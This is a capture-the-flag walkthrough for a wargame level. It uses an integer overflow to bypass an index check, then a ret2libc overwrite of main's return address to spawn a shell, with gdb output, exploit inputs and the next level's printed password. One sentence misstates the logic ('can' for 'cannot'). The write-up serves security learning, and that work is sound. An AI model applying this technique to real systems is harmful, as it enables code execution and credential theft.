# Level07

## Vulnerability type:

Integer Overflow

## Walkthrough:

Users can interact with the program using three commands: `store`, `read`, and `quit`.

- `store` command allows users to input a number (`n`) and an index (`n2`). The program stores `n` at `buffer[n2 * 4]`.

- `read` command lets users read a number stored at a specified index.

- `quit` command terminates the program.

The challenge arises from restrictions placed on the `store` command. Specifically, the program forbids certain indices, where `index % 3 == 0`, and numbers starting with the byte `0xb7`.

To exploit this program, we need to bypass these limitations, allowing us to overwrite the return address of the `main` function and control program execution.

## Exploitation and payload:

### Integer overflow

We want to overwrite the address at `buffer[114 * 4]`. However, we can use the index `114` directly since `114 % 3 == 0`. To bypass this limitation, we must select a `index` that, when multiplied by 4, is equal to `456`. We can achieve this by using an integer overflow.
If we set the 32th bit of the number `114`, we get the number `2147483762`.

```c
index = (int)(2147483762 * 4) // index is equal to 114
```

Most importantly, `2147483762 % 3 != 0`.

### Ret2LibC

```sh
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

```sh
(gdb) i proc map
process 1707
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
         0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
         0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
        0xf7e2b000 0xf7e2c000     0x1000        0x0
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0
        0xf7fda000 0xf7fdb000     0x1000        0x0
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000,0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

```sh
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384 // system address 0xf7e6aed0
 Index: 2147483762 // 114
 Completed store command successfully
Input command: store
 Number: 4160264172 // "/bin/sh" address 0xf7f897ec
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
